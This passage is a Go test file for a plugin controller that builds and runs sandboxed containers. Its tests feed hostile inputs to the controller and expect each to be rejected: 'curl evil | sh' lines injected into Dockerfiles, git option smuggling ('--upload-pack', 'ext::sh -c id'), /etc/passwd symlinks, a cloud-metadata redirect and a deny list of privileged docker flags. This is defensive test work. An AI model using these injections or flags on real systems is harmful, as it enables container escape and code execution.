package controller

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/leenkabha/llm_cache/internal/plugins"
	"github.com/leenkabha/llm_cache/internal/plugins/ctlapi"
	"github.com/leenkabha/llm_cache/internal/plugins/manifest"
	"github.com/leenkabha/llm_cache/internal/plugins/registry"
	"github.com/leenkabha/llm_cache/internal/plugins/testutil"
)

// ---- RunArgs: the isolation policy -------------------------------------------

func TestRunArgsAreHardenedAndCannotBeWidened(t *testing.T) {
	spec := RunSpec{Name: "llmcache-plugin-x", Image: "sha256:" + strings.Repeat("a", 64), Port: 8080, CPUs: 0.5, Memory: 256 << 20,
		PIDs: 64, Tmpfs: 32 << 20, Network: "llmcache-plugin-x", Internal: true, Env: map[string]string{"API_TOKEN": "super-secret-value"}}
	args := RunArgs(spec, "/tmp/envfile")
	joined := " " + strings.Join(args, " ") + " "

	for _, want := range []string{" --read-only ", " --cap-drop ALL ", " --security-opt no-new-privileges ", " --user 10001:10001 ",
		" --pids-limit 64 ", " --memory 268435456 ", " --memory-swap 268435456 ", " --cpus 0.500 ", " --init ", " --env-file /tmp/envfile ",
		" --network llmcache-plugin-x ", " --pull=never "} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %q in %s", want, joined)
		}
	}
	if !strings.Contains(joined, "/tmp:rw,noexec,nosuid,nodev,size=33554432") {
		t.Errorf("tmpfs is not size-limited and noexec: %s", joined)
	}
	for _, forbidden := range []string{"--privileged", "--cap-add", " -v ", "--volume", "--mount", " --pid ", "--pid=", "--ipc", "--uts", "--device",
		"network host", "--network=host", "docker.sock", "unconfined", "--user root", "--user 0", "--publish", " -p ", "super-secret-value", "--group-add", "--sysctl"} {
		if strings.Contains(joined, forbidden) {
			t.Errorf("forbidden flag/value %q present: %s", forbidden, joined)
		}
	}
	if args[len(args)-1] != spec.Image {
		t.Errorf("the image must be last, pinned by digest: %v", args)
	}
	// Publishing only on request, only on loopback.
	spec.Publish = true
	pub := strings.Join(RunArgs(spec, "/tmp/e"), " ")
	if !strings.Contains(pub, "--publish 127.0.0.1::8080") || strings.Contains(pub, "0.0.0.0") {
		t.Errorf("publish must bind loopback only: %s", pub)
	}
}

func TestEnvFileCarriesSecretsWithRestrictedPermissions(t *testing.T) {
	path, cleanup, err := writeEnvFile(map[string]string{"A": "1", "API_TOKEN": "s3cret"})
	if err != nil {
		t.Fatal(err)
	}
	defer cleanup()
	info, _ := os.Stat(path)
	if info.Mode().Perm() != 0o600 {
		t.Fatalf("env file mode = %v", info.Mode().Perm())
	}
	data, _ := os.ReadFile(path)
	if !strings.Contains(string(data), "API_TOKEN=s3cret") {
		t.Fatal("env file lacks the variable")
	}
	cleanup()
	if _, err := os.Stat(path); err == nil {
		t.Fatal("env file was not removed")
	}
	if _, _, err := writeEnvFile(map[string]string{"BAD": "line1\nINJECTED=1"}); err == nil {
		t.Fatal("a newline in a value could inject another variable")
	}
	if _, _, err := writeEnvFile(map[string]string{"BAD KEY": "v"}); err == nil {
		t.Fatal("an invalid variable name was accepted")
	}
}

func TestImageRefsAreValidated(t *testing.T) {
	for _, ok := range []string{"nginx", "ghcr.io/o/i:1.2", "reg:5000/a/b@sha256:" + strings.Repeat("a", 64)} {
		if !imageRefRE.MatchString(ok) {
			t.Errorf("%q rejected", ok)
		}
	}
	for _, bad := range []string{"", "-flag", "--privileged", "a b", "a;b", "a$(x)", "a\nb", "../x"} {
		if imageRefRE.MatchString(bad) && !strings.HasPrefix(bad, "..") {
			t.Errorf("%q accepted", bad)
		}
	}
}

// ---- source handling ---------------------------------------------------------

func gitRepo(t *testing.T, files map[string]string) (dir, commit string) {
	t.Helper()
	dir = t.TempDir()
	run := func(args ...string) string {
		cmd := exec.Command("git", args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t", "GIT_CONFIG_GLOBAL=/dev/null")
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	run("init", "-q", "-b", "main")
	for name, body := range files {
		p := filepath.Join(dir, name)
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	run("add", "-A")
	run("commit", "-q", "-m", "init")
	return dir, run("rev-parse", "HEAD")
}

func TestFetchRepoPinsTheExactRevision(t *testing.T) {
	repo, first := gitRepo(t, map[string]string{"plugin.yaml": "v1", "Dockerfile": "FROM scratch"})
	// A second commit changes the file; fetching the first SHA must not see it.
	if err := os.WriteFile(filepath.Join(repo, "plugin.yaml"), []byte("v2"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"add", "-A"}, {"commit", "-q", "-m", "second"}} {
		cmd := exec.Command("git", args...)
		cmd.Dir = repo
		cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@t", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@t", "GIT_CONFIG_GLOBAL=/dev/null")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("%v: %s", err, out)
		}
	}
	// git only serves an arbitrary SHA to fetch when uploadpack.allowAnySHA1InWant is on;
	// GitHub allows it. Allow it on the local test repository.
	cmd := exec.Command("git", "config", "uploadpack.allowAnySHA1InWant", "true")
	cmd.Dir = repo
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v: %s", err, out)
	}

	dest := filepath.Join(t.TempDir(), "src")
	commit, err := FetchRepo(context.Background(), repo, first, dest, true)
	if err != nil {
		t.Fatal(err)
	}
	if commit != first {
		t.Fatalf("resolved %s, want %s", commit, first)
	}
	data, _ := os.ReadFile(filepath.Join(dest, "plugin.yaml"))
	if string(data) != "v1" {
		t.Fatalf("checked out %q, want the pinned revision's content", data)
	}
	if _, err := os.Stat(filepath.Join(dest, ".git")); err == nil {
		t.Fatal(".git must be removed before building")
	}
	// HEAD resolves to the newest commit.
	dest2 := filepath.Join(t.TempDir(), "src")
	head, err := FetchRepo(context.Background(), repo, "HEAD", dest2, true)
	if err != nil || head == first {
		t.Fatalf("HEAD = %s, %v", head, err)
	}
}

func TestRepoURLValidation(t *testing.T) {
	for _, ok := range []string{"https://github.com/owner/repo", "https://github.com/owner/repo.git", "https://github.com/a-b/c_d.e"} {
		if err := ValidateRepoURL(ok, false); err != nil {
			t.Errorf("%q rejected: %v", ok, err)
		}
	}
	for _, bad := range []string{"http://github.com/o/r", "https://evil.com/o/r", "https://github.com.evil.com/o/r", "git@github.com:o/r.git",
		"file:///etc", "/etc/passwd", "https://github.com/o", "https://user@github.com/o/r", "--upload-pack=x", "https://github.com/o/r?x=1", "ext::sh -c id"} {
		if err := ValidateRepoURL(bad, false); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	if err := ValidateRepoURL("/tmp/some/repo", true); err != nil {
		t.Errorf("local path rejected in local mode: %v", err)
	}
	if _, err := FetchRepo(context.Background(), "https://github.com/o/r", "--upload-pack=x", t.TempDir()+"/d", false); err == nil {
		t.Error("an option-looking revision was accepted")
	}
	if _, err := FetchRepo(context.Background(), "https://github.com/o/r", "a..b", t.TempDir()+"/d", false); err == nil {
		t.Error("a range revision was accepted")
	}
}

func TestCheckTreeEnforcesLimitsAndRefusesSymlinks(t *testing.T) {
	root := t.TempDir()
	_ = os.WriteFile(filepath.Join(root, "a.txt"), []byte("hello"), 0o644)
	h1, err := CheckTree(root, Limits{MaxSourceBytes: 100, MaxFiles: 10})
	if err != nil || h1 == "" {
		t.Fatalf("%v", err)
	}
	h2, _ := CheckTree(root, Limits{MaxSourceBytes: 100, MaxFiles: 10})
	if h1 != h2 {
		t.Fatal("tree hash is not deterministic")
	}
	_ = os.WriteFile(filepath.Join(root, "a.txt"), []byte("hellp"), 0o644)
	if h3, _ := CheckTree(root, Limits{MaxSourceBytes: 100, MaxFiles: 10}); h3 == h1 {
		t.Fatal("tree hash ignores content")
	}
	if _, err := CheckTree(root, Limits{MaxSourceBytes: 3, MaxFiles: 10}); err == nil {
		t.Fatal("oversized source accepted")
	}
	if _, err := CheckTree(root, Limits{MaxSourceBytes: 100, MaxFiles: 0}); err == nil {
		t.Fatal("too many files accepted")
	}
	if err := os.Symlink("/etc/passwd", filepath.Join(root, "link")); err != nil {
		t.Skip("symlinks unavailable")
	}
	if _, err := CheckTree(root, Limits{MaxSourceBytes: 100, MaxFiles: 10}); err == nil {
		t.Fatal("a symlink was accepted")
	}
}

func TestSafeJoinAndReadRegular(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "sub"), 0o755)
	_ = os.WriteFile(filepath.Join(root, "sub", "f"), []byte("x"), 0o644)
	if _, err := SafeJoin(root, "sub/f"); err != nil {
		t.Fatal(err)
	}
	if _, err := SafeJoin(root, "."); err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{"", "/etc/passwd", "../x", "sub/../../x", "sub/missing", "a\x00b"} {
		if _, err := SafeJoin(root, bad); err == nil {
			t.Errorf("%q accepted", bad)
		}
	}
	if err := os.Symlink("/etc", filepath.Join(root, "esc")); err == nil {
		if _, err := SafeJoin(root, "esc/passwd"); err == nil {
			t.Error("a path through a symlink was accepted")
		}
		if _, err := ReadRegular(root, "esc", 100); err == nil {
			t.Error("a symlink was read")
		}
	}
	if _, err := ReadRegular(root, "sub/f", 0); err == nil {
		t.Error("size limit ignored")
	}
}

func TestBuildPythonContextGeneratesAFixedDockerfile(t *testing.T) {
	root := testutil.RepoRoot()
	src := filepath.Join(root, "sdk", "examples", "embedding-model")
	data, _ := os.ReadFile(filepath.Join(src, "plugin.yaml"))
	m, err := manifest.Parse(data)
	if err != nil {
		t.Fatal(err)
	}
	dest := t.TempDir()
	df, err := BuildPythonContext(root, m, src, dest, Limits{MaxSourceBytes: 10 << 20, MaxFiles: 1000})
	if err != nil {
		t.Fatal(err)
	}
	body, _ := os.ReadFile(filepath.Join(dest, df))
	for _, want := range []string{"FROM python:3.11-slim", "COPY plugin/sdk_hash_model /srv/app/plugins/sdk_hash_model", "USER 10001:10001", "--port", "8001"} {
		if !strings.Contains(string(body), want) {
			t.Errorf("Dockerfile lacks %q:\n%s", want, body)
		}
	}
	if strings.Contains(string(body), "ARG ") || strings.Contains(string(body), "ENV EMBEDDING") {
		t.Errorf("Dockerfile must not take build args or bake configuration:\n%s", body)
	}
	for _, f := range []string{"service/app/main.py", "plugin/sdk_hash_model/__init__.py", "plugin_requirements.txt", "service/requirements.txt"} {
		if _, err := os.Stat(filepath.Join(dest, f)); err != nil {
			t.Errorf("build context lacks %s", f)
		}
	}
	req, _ := os.ReadFile(filepath.Join(dest, "service", "requirements.txt"))
	for _, line := range strings.Split(string(req), "\n") {
		if !strings.HasPrefix(strings.TrimSpace(line), "#") && strings.Contains(line, "sentence-transformers") {
			t.Errorf("the runner must not install torch/sentence-transformers: %q", line)
		}
	}

	// A hostile manifest cannot inject Dockerfile lines through the module name.
	m.Spec.Python.Module = "x\nRUN curl evil | sh"
	if _, err := BuildPythonContext(root, m, src, t.TempDir(), Limits{MaxSourceBytes: 1 << 20, MaxFiles: 100}); err == nil {
		t.Error("an unsafe module name was accepted")
	}
	m.Spec.Python.Module = "sdk_hash_model"
	m.Spec.Python.Path = "../.."
	if _, err := BuildPythonContext(root, m, src, t.TempDir(), Limits{MaxSourceBytes: 1 << 20, MaxFiles: 100}); err == nil {
		t.Error("python.path escaped the repository")
	}
}

func TestRunnerEnvSelectsTheDevelopersBackend(t *testing.T) {
	parse := func(typ, py string) *manifest.Manifest {
		m, err := manifest.Parse([]byte("apiVersion: llmcache.dev/v1alpha1\nkind: Plugin\nmetadata: {name: p, version: 1.0.0}\nspec:\n  type: " + typ + "\n  runtime: {mode: python}\n  python: {module: mod, backend: " + py + "}\n"))
		if err != nil {
			t.Fatal(err)
		}
		return m
	}
	if e := RunnerEnv(parse("embedding-model", "my-model"), ""); e["EMBEDDING_MODEL_BACKEND"] != "my-model" {
		t.Errorf("%v", e)
	}
	if e := RunnerEnv(parse("vector-index", "my-idx"), ""); e["VECTOR_INDEX_BACKEND"] != "my-idx" || e["SIMILARITY_METRIC"] != "cosine" {
		t.Errorf("%v", e)
	}
	if e := RunnerEnv(parse("vector-index", "my-idx"), "euclidean"); e["SIMILARITY_METRIC"] != "euclidean" {
		t.Errorf("%v", e)
	}
	if e := RunnerEnv(parse("similarity-metric", "my-metric"), ""); e["SIMILARITY_METRIC"] != "my-metric" || e["VECTOR_INDEX_BACKEND"] != "faiss" {
		t.Errorf("%v", e)
	}
}

// ---- server with a fake runtime ----------------------------------------------

type fakeRuntime struct {
	mu        sync.Mutex
	image     ImageInfo
	imageFile []byte
	builds    []BuildSpec
	buildCtx  map[string]string // Dockerfile content seen at build time
	runs      []RunSpec
	removed   []string
	running   map[string]*ContainerInfo
	addrs     map[string]string
}

func newFake() *fakeRuntime {
	return &fakeRuntime{image: ImageInfo{ID: "sha256:" + strings.Repeat("1", 64), RepoDigest: "sha256:" + strings.Repeat("2", 64), Size: 1 << 20},
		running: map[string]*ContainerInfo{}, addrs: map[string]string{}, buildCtx: map[string]string{}}
}

func (f *fakeRuntime) Ping(context.Context) error { return nil }
func (f *fakeRuntime) PullOrInspect(_ context.Context, ref string, _ bool) (ImageInfo, error) {
	return f.image, nil
}
func (f *fakeRuntime) InspectImage(context.Context, string) (ImageInfo, error) { return f.image, nil }
func (f *fakeRuntime) RemoveImage(context.Context, string)                     {}
func (f *fakeRuntime) ReadFileFromImage(context.Context, string, string, int64) ([]byte, error) {
	if f.imageFile == nil {
		return nil, fmt.Errorf("no such file")
	}
	return f.imageFile, nil
}
func (f *fakeRuntime) Build(_ context.Context, s BuildSpec) ([]string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.builds = append(f.builds, s)
	if b, err := os.ReadFile(s.Dockerfile); err == nil {
		f.buildCtx[s.Tag] = string(b)
	}
	return []string{"built"}, nil
}
func (f *fakeRuntime) Run(_ context.Context, s RunSpec) error {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.runs = append(f.runs, s)
	f.running[s.Name] = &ContainerInfo{Running: true, Labels: s.Labels}
	return nil
}
func (f *fakeRuntime) Remove(_ context.Context, name string) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.removed = append(f.removed, name)
	delete(f.running, name)
}
func (f *fakeRuntime) Logs(context.Context, string, int) ([]string, error) {
	return []string{"log line"}, nil
}
func (f *fakeRuntime) Inspect(_ context.Context, name string) (*ContainerInfo, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.running[name], nil
}
func (f *fakeRuntime) Address(_ context.Context, name string, _ int) (string, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	return f.addrs[name], nil
}

const llmManifest = `apiVersion: llmcache.dev/v1alpha1
kind: Plugin
metadata: {name: my-llm, version: 1.0.0}
spec:
  type: llm
  runtime: {mode: container, port: 8080}
  resources: {cpu: 250m, memory: 128Mi}
`

func newServer(t *testing.T, mut func(*Config), rt *fakeRuntime, sc Scanner) (*Server, *httptest.Server) {
	t.Helper()
	cfg := Config{Token: "controller-token-1234567890", Publish: true, RunnerDir: testutil.RepoRoot(), AllowLocalGit: true, HealthWait: 2e9}
	if mut != nil {
		mut(&cfg)
	}
	s, err := New(cfg, rt, sc)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	srv := httptest.NewServer(s.Handler())
	t.Cleanup(srv.Close)
	return s, srv
}

func call(t *testing.T, srv *httptest.Server, token, method, path string, body any) (int, []byte) {
	t.Helper()
	var rd io.Reader
	if body != nil {
		b, _ := json.Marshal(body)
		rd = bytes.NewReader(b)
	}
	req, _ := http.NewRequest(method, srv.URL+path, rd)
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b
}

func TestControllerRequiresTheTokenEverywhereButHealth(t *testing.T) {
	_, srv := newServer(t, nil, newFake(), nil)
	for _, r := range []struct{ m, p string }{{"POST", "/v1/prepare"}, {"POST", "/v1/instances"}, {"DELETE", "/v1/instances/x"}, {"GET", "/v1/instances/x/logs"}, {"GET", "/v1/proxy/x/health"}} {
		for _, tok := range []string{"", "wrong", "controller-token-1234567890x"} {
			if code, _ := call(t, srv, tok, r.m, r.p, map[string]string{}); code != 401 {
				t.Errorf("%s %s with %q = %d, want 401", r.m, r.p, tok, code)
			}
		}
	}
	if code, _ := call(t, srv, "", "GET", "/health", nil); code != 200 {
		t.Errorf("/health = %d", code)
	}
	if _, err := New(Config{Token: "short"}, newFake(), nil); err == nil {
		t.Error("a short controller token was accepted")
	}
}

func TestPrepareImagePinsDigestScansAndRecordsProvenance(t *testing.T) {
	fr := newFake()
	_, srv := newServer(t, nil, fr, nil)
	code, body := call(t, srv, "controller-token-1234567890", "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "ghcr.io/o/llm:1", Manifest: llmManifest})
	if code != 200 {
		t.Fatalf("%d %s", code, body)
	}
	var res ctlapi.PrepareResult
	_ = json.Unmarshal(body, &res)
	if res.Digest != fr.image.RepoDigest {
		t.Fatalf("digest = %q, want the registry digest %q", res.Digest, fr.image.RepoDigest)
	}
	if res.Scan == nil || res.Scan.Status != "skipped" {
		t.Fatalf("scan = %+v; with no scanner it must say skipped, not pass", res.Scan)
	}
	if res.Provenance == nil || res.Provenance.ManifestSHA == "" || res.Provenance.Builder == "" {
		t.Fatalf("provenance = %+v", res.Provenance)
	}
	if !strings.Contains(res.Manifest, "my-llm") {
		t.Fatalf("manifest missing: %s", res.Manifest)
	}
}

func TestPrepareImageRejections(t *testing.T) {
	fr := newFake()
	_, srv := newServer(t, func(c *Config) { c.MaxImageBytes = 1 << 10; c.CPULimit = 0.1 }, fr, nil)
	tok := "controller-token-1234567890"
	cases := map[string]ctlapi.PrepareRequest{
		"oversized image":        {Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1", Manifest: llmManifest},
		"flag as image":          {Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "--privileged", Manifest: llmManifest},
		"unknown type":           {Mode: plugins.ModeImage, Type: "gpu", Image: "o/i:1", Manifest: llmManifest},
		"manifest type mismatch": {Mode: plugins.ModeImage, Type: plugins.TypeQueue, Image: "o/i:1", Manifest: llmManifest},
		"invalid manifest":       {Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1", Manifest: "kind: nope"},
		"no manifest anywhere":   {Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1"},
		"bad mode":               {Mode: "endpoint", Type: plugins.TypeLLM},
	}
	for name, req := range cases {
		if code, _ := call(t, srv, tok, "POST", "/v1/prepare", req); code/100 != 4 {
			t.Errorf("%s: status %d, want 4xx", name, code)
		}
	}
	// Resource requests above the operator ceiling are refused before anything runs.
	fr.image.Size = 10
	if code, body := call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1", Manifest: llmManifest}); code/100 != 4 || !strings.Contains(string(body), "allows at most") {
		t.Errorf("resource ceiling not enforced: %d %s", code, body)
	}
}

func TestRequireScanFailsClosedWithoutAScanner(t *testing.T) {
	_, srv := newServer(t, func(c *Config) { c.RequireScan = true }, newFake(), nil)
	code, body := call(t, srv, "controller-token-1234567890", "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1", Manifest: llmManifest})
	if code/100 != 4 || !strings.Contains(string(body), "scanner") {
		t.Fatalf("%d %s", code, body)
	}
}

type failingScanner struct{}

func (failingScanner) Name() string { return "fake" }
func (failingScanner) Scan(context.Context, string) (*registry.ScanReport, error) {
	return &registry.ScanReport{Scanner: "fake", Status: "failed", Message: "3 CRITICAL vulnerabilities found"}, nil
}

func TestScanFailureBlocksThePlugin(t *testing.T) {
	_, srv := newServer(t, nil, newFake(), failingScanner{})
	code, body := call(t, srv, "controller-token-1234567890", "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeImage, Type: plugins.TypeLLM, Image: "o/i:1", Manifest: llmManifest})
	if code/100 != 4 || !strings.Contains(string(body), "CRITICAL") {
		t.Fatalf("%d %s", code, body)
	}
}

func TestPrepareRepositoryBuildsWithoutArgsOrSecretsAndPinsTheCommit(t *testing.T) {
	fr := newFake()
	_, srv := newServer(t, nil, fr, nil)
	repo, commit := gitRepo(t, map[string]string{"plugin.yaml": llmManifest, "Dockerfile": "FROM scratch\n", "main.go": "package main"})
	tok := "controller-token-1234567890"

	code, body := call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeLLM, Repo: repo, Revision: "main", DryRun: true})
	var dry ctlapi.PrepareResult
	_ = json.Unmarshal(body, &dry)
	if code != 200 || dry.Commit != commit || dry.Digest != "" || len(fr.builds) != 0 {
		t.Fatalf("dry run: %d %s builds=%d", code, body, len(fr.builds))
	}

	code, body = call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeLLM, Repo: repo, Revision: "main", PluginID: "plg_1"})
	if code != 200 {
		t.Fatalf("%d %s", code, body)
	}
	var res ctlapi.PrepareResult
	_ = json.Unmarshal(body, &res)
	if res.Commit != commit || res.Provenance.Commit != commit || res.Provenance.SourceHash == "" {
		t.Fatalf("provenance = %+v", res.Provenance)
	}
	if len(fr.builds) != 1 {
		t.Fatalf("builds = %d", len(fr.builds))
	}
}

func TestPrepareRepositoryRejectsHostileRepositories(t *testing.T) {
	tok := "controller-token-1234567890"
	cases := map[string]map[string]string{
		"no manifest":         {"Dockerfile": "FROM scratch\n"},
		"escaping dockerfile": {"plugin.yaml": strings.Replace(llmManifest, "runtime: {mode: container, port: 8080}", "runtime: {mode: container, port: 8080, dockerfile: ../x}", 1)},
		"missing dockerfile":  {"plugin.yaml": llmManifest},
		"privileged manifest": {"plugin.yaml": strings.Replace(llmManifest, "port: 8080}", "port: 8080, privileged: true}", 1), "Dockerfile": "FROM scratch\n"},
		"type mismatch":       {"plugin.yaml": strings.Replace(llmManifest, "type: llm", "type: queue", 1), "Dockerfile": "FROM scratch\n"},
	}
	for name, files := range cases {
		fr := newFake()
		_, srv := newServer(t, nil, fr, nil)
		repo, _ := gitRepo(t, files)
		if code, _ := call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeLLM, Repo: repo}); code/100 != 4 {
			t.Errorf("%s: status %d, want 4xx", name, code)
		}
		if len(fr.builds) != 0 {
			t.Errorf("%s: a build ran for a rejected repository", name)
		}
	}
	// A non-GitHub URL is refused outright when local git is not allowed.
	_, srv := newServer(t, func(c *Config) { c.AllowLocalGit = false }, newFake(), nil)
	if code, _ := call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeLLM, Repo: "https://evil.example.com/o/r"}); code/100 != 4 {
		t.Errorf("non-GitHub URL status = %d", code)
	}
	// Source-size limit.
	repo, _ := gitRepo(t, map[string]string{"plugin.yaml": llmManifest, "Dockerfile": "FROM scratch\n", "big": strings.Repeat("x", 4096)})
	_, srv = newServer(t, func(c *Config) { c.MaxSourceBytes = 1024 }, newFake(), nil)
	if code, body := call(t, srv, tok, "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeLLM, Repo: repo}); code/100 != 4 || !strings.Contains(string(body), "limit") {
		t.Errorf("source limit: %d %s", code, body)
	}
}

func TestPythonRepositoryUsesAPlatformOwnedDockerfile(t *testing.T) {
	fr := newFake()
	_, srv := newServer(t, nil, fr, nil)
	src := filepath.Join(testutil.RepoRoot(), "sdk", "examples", "embedding-model")
	files := map[string]string{}
	_ = filepath.Walk(src, func(p string, i os.FileInfo, err error) error {
		if err == nil && i.Mode().IsRegular() {
			rel, _ := filepath.Rel(src, p)
			b, _ := os.ReadFile(p)
			files[filepath.ToSlash(rel)] = string(b)
		}
		return nil
	})
	// The developer's own Dockerfile (if any) must be ignored for python plugins.
	files["Dockerfile"] = "FROM evil\nRUN curl evil | sh\n"
	repo, _ := gitRepo(t, files)
	code, body := call(t, srv, "controller-token-1234567890", "POST", "/v1/prepare", ctlapi.PrepareRequest{Mode: plugins.ModeRepository, Type: plugins.TypeEmbeddingModel, Repo: repo, PluginID: "plg_py"})
	if code != 200 {
		t.Fatalf("%d %s", code, body)
	}
	fr.mu.Lock()
	defer fr.mu.Unlock()
	for _, df := range fr.buildCtx {
		if strings.Contains(df, "evil") || !strings.Contains(df, "FROM python:3.11-slim") || !strings.Contains(df, "8001") {
			t.Fatalf("unexpected Dockerfile:\n%s", df)
		}
	}
	if len(fr.buildCtx) != 1 {
		t.Fatalf("builds = %d", len(fr.buildCtx))
	}
}

// ---- proxy ---------------------------------------------------------------------

func TestStartRejectsUnsafeRequests(t *testing.T) {
	_, srv := newServer(t, func(c *Config) { c.AllowEgress = false }, newFake(), nil)
	tok := "controller-token-1234567890"
	digest := "sha256:" + strings.Repeat("a", 64)
	egress := strings.Replace(llmManifest, "resources:", "network: {egress: internet}\n  resources:", 1)
	for name, req := range map[string]ctlapi.StartRequest{
		"bad instance id": {InstanceID: "../x", Type: plugins.TypeLLM, Digest: digest, Manifest: llmManifest},
		"mutable tag":     {InstanceID: "p1", Type: plugins.TypeLLM, Digest: "latest", Manifest: llmManifest},
		"egress denied":   {InstanceID: "p2", Type: plugins.TypeLLM, Digest: digest, Manifest: egress},
		"bad manifest":    {InstanceID: "p3", Type: plugins.TypeLLM, Digest: digest, Manifest: "nope"},
		"privileged":      {InstanceID: "p4", Type: plugins.TypeLLM, Digest: digest, Manifest: strings.Replace(llmManifest, "port: 8080}", "port: 8080, privileged: true}", 1)},
	} {
		if code, _ := call(t, srv, tok, "POST", "/v1/instances", req); code/100 != 4 {
			t.Errorf("%s: status %d, want 4xx", name, code)
		}
	}
}

func TestProxyAuthenticatesToThePluginAndEnforcesLimits(t *testing.T) {
	fr := newFake()
	var gotAuth, gotPath string
	plugin := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth, gotPath = r.Header.Get("Authorization"), r.URL.RequestURI()
		switch r.URL.Path {
		case "/health":
			w.WriteHeader(200)
		case "/v1/big":
			_, _ = w.Write(bytes.Repeat([]byte("x"), 2048))
		case "/v1/redirect":
			http.Redirect(w, r, "http://169.254.169.254/", 302)
		case "/admin/secret":
			_, _ = w.Write([]byte("must not be reachable"))
		default:
			_, _ = w.Write([]byte(`{"ok":true}`))
		}
	}))
	defer plugin.Close()
	s, srv := newServer(t, func(c *Config) { c.MaxProxyResult = 1024 }, fr, nil)
	fr.addrs["llmcache-plugin-p1"] = strings.TrimPrefix(plugin.URL, "http://")
	tok := "controller-token-1234567890"

	code, body := call(t, srv, tok, "POST", "/v1/instances", ctlapi.StartRequest{InstanceID: "p1", Type: plugins.TypeLLM, Digest: "sha256:" + strings.Repeat("b", 64), Manifest: llmManifest, Env: map[string]string{"X": "1"}})
	if code != 200 {
		t.Fatalf("start: %d %s", code, body)
	}
	// The container was created hardened and with a controller-derived credential.
	if len(fr.runs) != 1 || fr.runs[0].Internal || !fr.runs[0].Publish {
		t.Fatalf("run spec = %+v", fr.runs)
	}
	if fr.runs[0].Env["PLUGIN_AUTH_TOKEN"] != s.pluginToken("p1") || fr.runs[0].Env["PORT"] != "8080" {
		t.Fatalf("env = %v", fr.runs[0].Env)
	}
	if fr.runs[0].Memory != 128<<20 || fr.runs[0].CPUs != 0.25 {
		t.Fatalf("resources = %v %v", fr.runs[0].Memory, fr.runs[0].CPUs)
	}

	// Allowed: the plugin protocol. The orchestrator's token never reaches the plugin.
	code, body = call(t, srv, tok, "GET", "/v1/proxy/p1/v1/thing?a=b", nil)
	if code != 200 || string(bytes.TrimSpace(body)) != `{"ok":true}` {
		t.Fatalf("proxy: %d %s", code, body)
	}
	if gotAuth != "Bearer "+s.pluginToken("p1") || strings.Contains(gotAuth, tok) {
		t.Fatalf("plugin saw Authorization %q", gotAuth)
	}
	if gotPath != "/v1/thing?a=b" {
		t.Fatalf("plugin saw %q", gotPath)
	}
	// Not the plugin protocol, or traversal: refused before reaching the container.
	for _, p := range []string{"/v1/proxy/p1/admin/secret", "/v1/proxy/p1/v1/../admin/secret", "/v1/proxy/p1/metrics"} {
		if code, body := call(t, srv, tok, "GET", p, nil); code == 200 || strings.Contains(string(body), "must not be reachable") {
			t.Errorf("%s reached the plugin: %d %s", p, code, body)
		}
	}
	// Responses over the limit are refused, never truncated silently.
	if code, _ := call(t, srv, tok, "GET", "/v1/proxy/p1/v1/big", nil); code != 502 {
		t.Errorf("oversized response status = %d, want 502", code)
	}
	// Redirects are not followed.
	if code, _ := call(t, srv, tok, "GET", "/v1/proxy/p1/v1/redirect", nil); code != 302 {
		t.Errorf("redirect status = %d, want the 302 passed through unfollowed", code)
	}
	// Unknown instance.
	if code, _ := call(t, srv, tok, "GET", "/v1/proxy/nope/v1/x", nil); code != 404 {
		t.Errorf("unknown instance = %d", code)
	}
	// Restarting with identical input re-uses the running container.
